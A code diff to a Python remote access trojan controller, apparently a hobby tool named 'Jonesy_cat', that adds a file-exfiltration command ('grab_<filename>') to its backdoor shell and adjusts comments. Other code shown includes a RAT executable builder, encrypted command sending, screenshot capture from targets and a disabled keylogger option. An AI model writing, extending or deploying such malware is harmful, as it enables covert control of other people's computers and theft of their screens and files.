@@ -23,7 +23,7 @@ CYEL = '\33[33m'
 CGREY = '\33[44m'
 
 
-#### - SYMMETRIC ENCRYPTION - ####
+'#### - SYMMETRIC ENCRYPTION - ####'
 # Generate Key:
 # - Each time a connection is compromised you should generate a new key for exploits
 def generate_key():
@@ -34,13 +34,13 @@ def generate_key():
     print(CYEL + "'" + key.decode() + "'" + CEND)
     menu()
 
-# Read Key:
+'# Read Key:'
 # - read key from file
 def read_key():
     return open("Jonesy_cat.key", "rb").read()
 
 
-# Encrypt message:
+'# Encrypt message:'
 # - read key and encrypt
 def encrypt_mess(comm):
     'encode message'
@@ -51,18 +51,18 @@ def encrypt_mess(comm):
     encrypted = f.encrypt(encoded_message)
     return encrypted
 
-# Decrypt data
+'# Decrypt data'
 def decrypt_mess(message):
     key = read_key()
     f = Fernet(key)
     decrypted_mess = f.decrypt(message)
     return decrypted_mess
 
-#read executable code file
+'#read executable code file'
 def read_code():
     return open("exec_example.py", "rb").read()
 
-#### - GENERAL FUNCTIONS - ####
+'#### - GENERAL FUNCTIONS - ####'
 def banner():
     print("")
     print("")
@@ -136,7 +136,7 @@ def header():
     print("------------------------------------------------created by Ford Larman----------------------------------------------")
     menu()
 
-# Menu options
+'# Menu options'
 def menu():
     print("\n")
     print("---Menu---")
@@ -158,7 +158,7 @@ def menu():
         print(CRED + "[!] Bad Input" + CEND)
 
 
-# Connect to Server
+'# Connect to Server'
 def find_Server():
     'initialise socket'
     ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -178,7 +178,7 @@ def find_Server():
     print(CBLU + "[+] @ " + str(address) + CEND)
     backdoor(clientsocket, ss)
 
-# Create rat file
+'# Create rat file'
 def create_rat():
     print(CBLU + "\n[+] Creating RAT Executable" + CEND)
     print("Please Enter Your designated machine details.")
@@ -227,7 +227,7 @@ def make_exec_file(name):
     os.system("rm " + name + ".py")
     return
 
-### screen shot function ###
+'screen shot function'
 # handle image as packets
 def receive_image(conn):
     data_size = struct.unpack('>I', conn.recv(4))[0]
@@ -237,10 +237,9 @@ def receive_image(conn):
         received_payload += conn.recv(remaining_payload_size)
         remaining_payload_size = data_size - len(received_payload)
     data = pickle.loads(received_payload)
-    print(data)
     return data
 
-#### - BACKDOOR FUNCTIONS - ####
+'#### - BACKDOOR FUNCTIONS - ####'
 # Communicate via backdoor
 def backdoor(client, ss):
     print("\n")
@@ -257,8 +256,8 @@ def backdoor(client, ss):
             print("You have a few options: ")
             print("'exit'  - to close connection")
             print("'screen_grab' - to screenshot target")
-            print("'_keylogr' - to initiate keylogger")
-            print("'<filename>_grabr - to download a file")
+            #print("'_keylogr' - to initiate keylogger")
+            print("'grab_<filename> - to download a file")
             print("\nOtherwise all directory commands remain the same.")
             print("Goodluck!")
             print("- JC\n")
@@ -270,6 +269,16 @@ def backdoor(client, ss):
             data = receive_image(client)
             img = "screen_grab.png"
             data.save(img)
+        elif "grab_" in shell:
+              message = encrypt_mess(shell)
+              client.sendall(message)
+              file_name = shell.replace("grab_", "")
+              data = receive_image(client)
+              # save bytes to file format
+              f = open(file_name, "wb")
+              f.write(data)
+              f.close()
+
         else:
             message = encrypt_mess(shell)
             #print(message)
